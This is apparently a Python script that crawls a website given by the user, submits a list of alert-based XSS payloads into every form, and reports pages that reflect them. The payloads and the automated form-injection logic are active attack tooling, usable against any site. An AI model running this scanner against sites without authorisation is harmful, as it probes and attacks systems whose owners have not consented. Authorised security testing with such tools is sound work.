import requests
from bs4 import BeautifulSoup
import re
import urllib.parse

# Function to print the XSS banner
def print_XSS():
    print("""
    ██   ██    ███████    ███████  
     ██ ██     ██         ██    
      ███      ███████    ███████  
     ██ ██          ██         ██ 
    ██   ██    ███████    ███████  
    """)

# Common XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<script>alert(document.domain)</script>",
    "1\"><svg/onload=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>"
]

def get_forms(url):
    """Extract all forms from the webpage"""
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")
        print(f"\n🔍 Found {len(forms)} forms on {url}")
        return forms
    except requests.exceptions.RequestException as e:
        print(f"❌ Error fetching URL: {e}")
        return []

def submit_form(form, base_url, payload):
    """Submit form with XSS payload and check response"""
    action = form.get("action")
    method = form.get("method", "get").lower()
    inputs = form.find_all(["input", "textarea", "button"])
    
    form_data = {}
    for input_tag in inputs:
        name = input_tag.get("name")
        if name:
            form_data[name] = payload if input_tag.get("type") != "hidden" else input_tag.get("value", "")
    
    target_url = urllib.parse.urljoin(base_url, action) if action else base_url
    print(f"\n🔹 Testing form submission at: {target_url} (Method: {method.upper()})")
    
    try:
        response = requests.post(target_url, data=form_data) if method == "post" else requests.get(target_url, params=form_data)
        if payload in response.text:
            return response.text, target_url
    except requests.exceptions.RequestException as e:
        print(f"❌ Error submitting form: {e}")
    return "", target_url

def scan_xss(url, vulnerabilities, location="General"):
    """Scan a URL for XSS vulnerabilities"""
    print(f"\n🔍 Scanning {url} ({location}) for XSS vulnerabilities...\n")
    forms = get_forms(url)
    
    if forms:
        for form in forms:
            for payload in xss_payloads:
                response, tested_url = submit_form(form, url, payload)
                if response and payload in response:
                    vulnerabilities.append((tested_url, location, payload))
                    print(f"✅ XSS found: {tested_url} ({location}) with payload: {payload}")
    else:
        print(f"❌ No forms found on {location} page.")

def crawl_website(url, vulnerabilities):
    """Crawl the website to find links and scan them for XSS"""
    print("\n🔍 Crawling website to find pages...\n")
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")
        links = set(a.get("href") for a in soup.find_all("a") if a.get("href"))
        
        for link in links:
            full_url = urllib.parse.urljoin(url, link)
            print(f" - Found page: {full_url}")
            scan_xss(full_url, vulnerabilities, location=link.strip("/"))
    except requests.exceptions.RequestException as e:
        print(f"❌ Error crawling website: {e}")

def generate_report(url, vulnerabilities):
    """Generate and save a scan report"""
    report_filename = "xss_scan_report.txt"
    with open(report_filename, "w") as report_file:
        report_file.write(f"XSS Vulnerability Scan Report for {url}\n")
        report_file.write("=" * 50 + "\n\n")
        
        if vulnerabilities:
            for url, location, payload in vulnerabilities:
                report_file.write(f"Vulnerability in {location}: {url}\nPayload: {payload}\n\n")
        else:
            report_file.write("No XSS vulnerabilities found.\n")
    print(f"\n📄 Scan report saved as {report_filename}")

def main():
    print_XSS()
    target_url = input("Enter the URL to scan: ").strip()
    vulnerabilities = []
    
    crawl_website(target_url, vulnerabilities)
    scan_xss(target_url, vulnerabilities, location="Main Page")
    generate_report(target_url, vulnerabilities)

if __name__ == "__main__":
    main()
